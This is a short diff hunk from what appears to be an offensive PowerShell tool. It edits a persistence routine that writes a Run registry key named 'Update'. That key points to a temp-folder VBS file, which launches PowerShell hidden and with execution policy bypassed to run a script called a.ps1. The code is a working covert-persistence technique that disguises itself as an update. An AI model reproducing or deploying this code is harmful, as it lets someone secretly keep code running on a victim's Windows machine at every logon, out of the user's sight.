@@ -270,7 +270,7 @@ $functions =  {
             }
 
             $vbsname = "a.vbs"
-            New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value "C:\windows\system32\cmd.exe /C powershell -noexit -nologo -WindowStyle Hidden -executionpolicy bypass -command $env:temp\$vbsname" -force
+            New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Update -PropertyType String -Value $env:temp\$vbsname -force
             echo "Set objShell = CreateObject(`"Wscript.shell`")" > $env:temp\$vbsname
             echo "objShell.run(`"powershell -noexit -WindowStyle Hidden -executionpolicy bypass -file $env:temp\a.ps1`")" >> $env:temp\$vbsname
             
